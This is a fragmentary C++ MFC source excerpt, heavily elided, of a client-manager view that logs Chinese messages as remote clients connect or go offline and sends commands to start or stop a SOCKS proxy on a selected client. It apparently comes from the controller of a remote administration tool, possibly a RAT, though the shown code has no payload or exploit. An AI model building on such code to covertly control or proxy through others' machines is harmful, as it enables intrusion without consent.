...
void CMyClientManaView::InsertItem(MyServerTran* pItem, BOOL IsShowLogs)
{
	...
	{
		//显示连接信息
		wsprintf(m_Text, _T("客户【%s - %s】已经连接 - 所属分组【%s】"), 
			pItem->GetTitle(), pItem->GetLoginInfo()->m_PcName, pItem->GetViewName());
		GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
	}
}
...
BOOL CMyClientManaView::DeleteItemFromId(LPCTSTR sId)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		...
		{
			TCHAR m_Text[256] = {0};
			wsprintf(m_Text, _T("客户【%s - %s】已经离线 - 所属分组【%s】"), pTran->GetTitle(), pTran->GetLoginInfo()->m_PcName, pTran->GetViewName());
			GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
			GetListCtrl().DeleteItem(i);
			delete pTran;
			return TRUE;
...
{
	while(WaitForSingleObject(m_ExitEvent, 60000) == WAIT_TIMEOUT)
	{
...
void CMyClientManaView::OnClientStartSocks() 
{
	...
	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_SockInfo;
	ct.cbData = sizeof(MYSOCKSINFO);
...
void CMyClientManaView::OnClientStopSocks() 
{
	...
	if(pItem != NULL)
	{
		pItem->SendCmd(WM_CONNECT_SOCKS_STOP, 0x00);
	}
}
